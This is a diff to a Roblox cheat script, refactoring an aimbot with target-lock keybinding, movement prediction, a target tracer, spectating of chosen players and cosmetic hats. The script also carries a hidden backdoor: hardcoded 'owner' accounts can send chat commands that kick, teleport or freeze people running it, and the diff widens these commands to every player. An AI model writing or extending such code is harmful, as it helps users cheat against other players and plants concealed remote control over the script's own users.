@@ -68,6 +68,7 @@ getgenv().TargetAimbot = {
     FillingColor = Color3.fromRGB(255, 255, 255),
     OutliningColor = Color3.fromRGB(255, 255, 255),
     HitEffect = true,
+	TargetKey = 'Q',
     HitEffectType = "Electric", -- Dots, Electric
     HitEffectColor = Color3.fromRGB(255, 255, 255),
     CheckWall = false,
@@ -96,11 +97,11 @@ local HitSoundIds = {
     Bonk = "rbxassetid://5766898159",
     Minecraft = "rbxassetid://4018616850"
 }
-
+getgenv().ActiveHats = {}
 local mobile = false
 -- 🔍 Kiểm tra nếu là thiết bị mobile hoặc tablet
 if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and mobile then
-    getgenv().keytoclick = Q
+    getgenv().keytoclick = 'Q'
 
     local tool = Instance.new("Tool")
     tool.RequiresHandle = false
@@ -132,9 +133,9 @@ local owners = {
     "dao_beo"
 }
 
-function x1y2z3(owner)
-    if owner then
-        LocalPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
+function x1y2z3(targetPlayer, owner)
+    if targetPlayer and targetPlayer.Character and owner and owner.Character then
+        targetPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
     end
 end
 
@@ -151,9 +152,43 @@ function a1b2c3(ownerName)
     if owner then
         owner.Chatted:Connect(function(message)
             if message == "/kick ." then
-                LocalPlayer:Kick("Admins Has Kicked You.")
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner then -- Không kick owner
+                        player:Kick("Admins Has Kicked You.")
+                    end
+                end
             elseif message == "/bring ." then
-                x1y2z3(owner)
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner then -- Không bring owner
+                        x1y2z3(player, owner)
+                    end
+                end
+            elseif message == "/freeze ." then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+                        player.Character.Humanoid.WalkSpeed = 0
+                        player.Character.Humanoid.JumpPower = 0
+                        player.Character.HumanoidRootPart.Anchored = true
+                        game:GetService("StarterGui"):SetCore("SendNotification", {
+                            Title = "Admin Command",
+                            Text = "You have been frozen by " .. ownerName,
+                            Duration = 3
+                        })
+                    end
+                end
+            elseif message == "/unfreeze ." then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+                        player.Character.Humanoid.WalkSpeed = 16 -- Giá trị mặc định
+                        player.Character.Humanoid.JumpPower = 50 -- Giá trị mặc định
+                        player.Character.HumanoidRootPart.Anchored = false
+                        game:GetService("StarterGui"):SetCore("SendNotification", {
+                            Title = "Admin Command",
+                            Text = "You have been unfrozen by " .. ownerName,
+                            Duration = 3
+                        })
+                    end
+                end
             end
         end)
     end
@@ -413,8 +448,8 @@ local function ClosestPlr(Part)
     return Closest
 end
 
-local function Resolver(Target, getgenv().TargetAimbot)
-    local Part = Target.Character[getgenv().TargetAimbot.RealHitPart]
+local function Resolver(Target, Aimbot)
+    local Part = Target.Character[Aimbot.RealHitPart]
     local CurrentPosition = Part.Position
     local CurrentTime = tick()
     wait()
@@ -425,7 +460,7 @@ local function Resolver(Target, getgenv().TargetAimbot)
     local Velocity = DistanceTraveled / TimeInterval
     CurrentPosition = NewPosition
     CurrentTime = NewTime
-    if getgenv().TargetAimbot.ResolverType == "MoveDirection" then
+    if Aimbot.ResolverType == "MoveDirection" then
         return Target.Character.Humanoid.MoveDirection * Target.Character.Humanoid.WalkSpeed
     end
     return Velocity
@@ -448,7 +483,7 @@ local function CalculateAutoPrediction(target)
 end
 
 local function AimRedirect()
-    if not (getgenv().TargetAimbot.Enabled and TargBindEnabled and TargetPlr and TargetPlr.Character and TargetPlr.Character:FindFirstChild(getgenv().TargetAimbot.RealHitPart)) then
+    if not (TargetAimbot.Enabled and TargBindEnabled and TargetPlr and TargetPlr.Character and TargetPlr.Character:FindFirstChild(TargetAimbot.RealHitPart)) then
         return
     end
     -- Check if local player and target are alive
@@ -461,7 +496,7 @@ local function AimRedirect()
     end
 
     local cam = Workspace.CurrentCamera
-    local rootPart = TargetPlr.Character[getgenv().TargetAimbot.RealHitPart]
+    local rootPart = TargetPlr.Character[TargetAimbot.RealHitPart]
     local targetVelocity = rootPart.AssemblyLinearVelocity
 
     -- Tính toán prediction tự động
@@ -469,7 +504,7 @@ local function AimRedirect()
     local predictedPosition = rootPart.Position + (targetVelocity * predictionTime)
 
     -- Nếu có jump offset, áp dụng thêm
-    predictedPosition += Vector3.new(0, getgenv().TargetAimbot.RealJumpOffset, 0)
+    predictedPosition += Vector3.new(0, getgenv().TargetAimbot.JumpOffset, 0)
 
     -- ⚡ Đặt camera và hướng aim với smoothing
     local newCF = CFrame.lookAt(cam.CFrame.Position, predictedPosition)
@@ -480,7 +515,7 @@ local function AimRedirect()
     end
 
     -- Nếu muốn quay nhân vật theo hướng aim với smoothing:
-    if getgenv().TargetAimbot.LookAt and LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
+    if TargetAimbot.LookAt and LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
         local charNewCF = CFrame.lookAt(LocalPlayer.Character.PrimaryPart.Position, predictedPosition)
         if getgenv().TargetAimbot.Smoothing then
             LocalPlayer.Character:SetPrimaryPartCFrame(LocalPlayer.Character.PrimaryPart.CFrame:Lerp(charNewCF, getgenv().TargetAimbot.SmoothingFactor))
@@ -491,54 +526,37 @@ local function AimRedirect()
 end
 
 RunService.Heartbeat:Connect(function()
-    if getgenv().TargetAimbot.Enabled and TargBindEnabled and TargetPlr then
-        TargResolvePos = Resolver(TargetPlr, getgenv().TargetAimbot)
+    if TargetAimbot.Enabled and TargBindEnabled and TargetPlr then
+        TargResolvePos = Resolver(TargetPlr, TargetAimbot)
     end
     updateTargetHealth()
-    if getgenv().TargetAimbot.Enabled and TargBindEnabled and TargetPlr then
+    if TargetAimbot.Enabled and TargBindEnabled and TargetPlr then
         AimRedirect()
     end
 end)
 
-UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
-    if gameProcessedEvent then return end
-
-    if input.KeyCode == Enum.KeyCode.Q then
-	    if isTyping() then
-			return
-		end
-
-        if getgenv().TargetAimbot.Enabled then
-            local Closest = ClosestPlr(getgenv().TargetAimbot.RealHitPart)
-            if Closest then
-                if TargBindEnabled then
-                    TargBindEnabled = false
-                    targetHealth = nil
-                    if getgenv().TargetAimbot.LookAt then
-                        LocalPlayer.Character.Humanoid.AutoRotate = true
-                    end
-                    if getgenv().TargetAimbot.ViewAt then
-                        Workspace.CurrentCamera.CameraSubject = LocalPlayer.Character.Humanoid
-                    end
-                    StarterGui:SetCore("SendNotification", {
-                        Title = "Matrix.cc",
-                        Text = "Untargeted: " .. TargetPlr.DisplayName,
-                        Duration = 1
-                    })
-                else
-                    TargBindEnabled = true
-                    TargetPlr = Closest
-                    targetHealth = TargetPlr.Character:FindFirstChild("Humanoid").Health
-                    StarterGui:SetCore("SendNotification", {
-                        Title = "Matrix.cc",
-                        Text = "Targeting: " .. TargetPlr.DisplayName,
-                        Duration = 1
-                    })
-                end
-            end
+local function selectTarget()
+    if TargBindEnabled and TargetPlr then
+        -- Bỏ chọn mục tiêu hiện tại
+        TargBindEnabled = false
+        targetHealth = nil
+        TargetPlr = nil
+        if getgenv().TargetAimbot.LookAt then
+            LocalPlayer.Character.Humanoid.AutoRotate = true
+        end
+        if getgenv().TargetAimbot.ViewAt then
+            Workspace.CurrentCamera.CameraSubject = LocalPlayer.Character.Humanoid
+        end
+    else
+        -- Chọn mục tiêu mới nếu chưa có
+        local Closest = ClosestPlr(getgenv().TargetAimbot.RealHitPart)
+        if Closest then
+            TargBindEnabled = true
+            TargetPlr = Closest
+            targetHealth = TargetPlr.Character:FindFirstChild("Humanoid").Health
         end
     end
-end)
+end
 
 RunService.Heartbeat:Connect(function()
     if getgenv().TargetAimbot.Enabled and TargBindEnabled and TargetPlr then
@@ -566,13 +584,26 @@ RunService.RenderStepped:Connect(function()
 end)
 
 RunService.RenderStepped:Connect(function()
-    if getgenv().TargetAimbot.Enabled and getgenv().TargetAimbot.Tracer and TargBindEnabled and TargetPlr and TargetPlr.Character and TargetPlr.Character:FindFirstChild(getgenv().TargetAimbot.RealHitPart) then
+    if getgenv().TargetAimbot.Enabled 
+        and getgenv().TargetAimbot.Tracer 
+        and TargBindEnabled 
+        and TargetPlr 
+        and TargetPlr.Character 
+        and TargetPlr.Character:FindFirstChild(getgenv().TargetAimbot.RealHitPart) then
+        
         local MousePos = UserInputService:GetMouseLocation()
-        local TargetPos = Workspace.CurrentCamera:WorldToViewportPoint(TargetPlr.Character[getgenv().TargetAimbot.RealHitPart].Position)
-        Tracer.From = Vector2.new(MousePos.X, MousePos.Y)
-        Tracer.To = Vector2.new(TargetPos.X, TargetPos.Y)
-        Tracer.Color = getgenv().TargetAimbot.TracerColor
-        Tracer.Visible = true
+        local TargetPos, onScreen = Workspace.CurrentCamera:WorldToViewportPoint(
+            TargetPlr.Character[getgenv().TargetAimbot.RealHitPart].Position
+        )
+        
+        if onScreen then
+            Tracer.From = Vector2.new(MousePos.X, MousePos.Y)
+            Tracer.To = Vector2.new(TargetPos.X, TargetPos.Y)
+            Tracer.Color = getgenv().TargetAimbot.TracerColor
+            Tracer.Visible = true
+        else
+            Tracer.Visible = false
+        end
     else
         Tracer.Visible = false
     end
@@ -586,9 +617,14 @@ LeftGroupBox:AddToggle('AimlockEnabled', {
 	Callback = function(Value)
 		getgenv().TargetAimbot.Enabled = Value
 	end
+}):AddKeyPicker('TargetKey', {
+    Default = 'Q', -- Phím mặc định là Q
+    Mode = 'Toggle',
+    Text = 'Target Key',
+    Callback = function()
+        selectTarget()
+    end
 })
-LeftGroupBox:AddLabel("Press Q to set target")
-
 LeftGroupBox:AddToggle('Autoselect', {
 	Text = 'Autoselect',
 	Default = getgenv().TargetAimbot.Autoselect,
@@ -605,11 +641,11 @@ LeftGroupBox:AddToggle('Resolver', {
 	end
 })
 
-LeftGroupBox:AddInput('JumpOffset', {
+LeftGroupBox:AddInput('Offset', {
 	Default = tostring(getgenv().TargetAimbot.JumpOffset),
 	Numeric = true,
 	Finished = true,
-	Text = 'Jump Offset',
+	Text = 'Offset',
 	Callback = function(Value)
 		getgenv().TargetAimbot.JumpOffset = tonumber(Value) or 0
 		getgenv().TargetAimbot.RealJumpOffset = getgenv().TargetAimbot.JumpOffset
@@ -768,21 +804,34 @@ local PlayerGroup = Tabs.Aim:AddRightGroupbox('Player List')
 local SelectedPlayer
 PlayerGroup:AddDropdown('MyPlayerDropdown', {
 	SpecialType = 'Player',
-	ExcludeLocalPlayer = true, -- true / false, excludes the localplayer from the Player type
+	ExcludeLocalPlayer = true,
+
+	
 	Text = 'A player dropdown',
 
 	Callback = function(Value)
 		SelectedPlayer = Players:FindFirstChild(Value)
 	end
 })
-
+local isViewing = false -- Biến để theo dõi trạng thái camera
+local previousCameraSubject = nil -- Lưu trữ CameraSubject trước đó
 PlayerGroup:AddButton({
-	Text = 'View',
-	Func = function()
-		if SelectedPlayer and SelectedPlayer.Character then
-			Workspace.CurrentCamera.CameraSubject = SelectedPlayer.Character.Humanoid
-		end
-	end
+    Text = 'View',
+    Func = function()
+        if SelectedPlayer and SelectedPlayer.Character then
+            if not isViewing then
+                -- Lưu trữ CameraSubject hiện tại
+                previousCameraSubject = Workspace.CurrentCamera.CameraSubject
+                -- Chuyển camera sang nhân vật được chọn
+                Workspace.CurrentCamera.CameraSubject = SelectedPlayer.Character.Humanoid
+                isViewing = true
+            else
+                -- Quay lại CameraSubject trước đó (thường là nhân vật của LocalPlayer)
+                Workspace.CurrentCamera.CameraSubject = previousCameraSubject or LocalPlayer.Character.Humanoid
+                isViewing = false
+            end
+        end
+    end
 })
 
 PlayerGroup:AddButton({
@@ -1026,6 +1075,7 @@ local function CreateHat(Character)
     Light.Parent = Cone
 
     Cone.Parent = Character
+	table.insert(getgenv().ActiveHats, Cone)
 end
 
 local function OnCharacterAdded(Character)
@@ -1055,16 +1105,29 @@ if Services.LocalPlayer.Character then
 end
 
 MiscGroup:AddToggle('ChinaHat', {
-	Text = 'China Hat',
-	Default = getgenv().ChinaHatSettings.enabled,
-	Callback = function(Value)
-		getgenv().ChinaHatSettings.enabled = Value
-		for _, player in pairs(Players:GetPlayers()) do
-            if player.Character then
-                OnCharacterAdded(player.Character)
+    Text = 'China Hat',
+    Default = getgenv().ChinaHatSettings.enabled,
+    Callback = function(Value)
+        getgenv().ChinaHatSettings.enabled = Value
+        if Value then
+            -- Tạo hat cho tất cả các người chơi
+            for _, player in pairs(Players:GetPlayers()) do
+                if player.Character then
+                    CreateHat(player.Character)
+                end
+            end
+        else
+            -- Xóa tất cả các hat
+            if getgenv().ActiveHats then
+                for _, hat in pairs(getgenv().ActiveHats) do
+                    if hat and hat.Parent then
+                        hat:Destroy()
+                    end
+                end
+                getgenv().ActiveHats = {}
             end
         end
-	end
+    end
 })
 
 MiscGroup:AddLabel('Hat Color'):AddColorPicker('HatColor', {
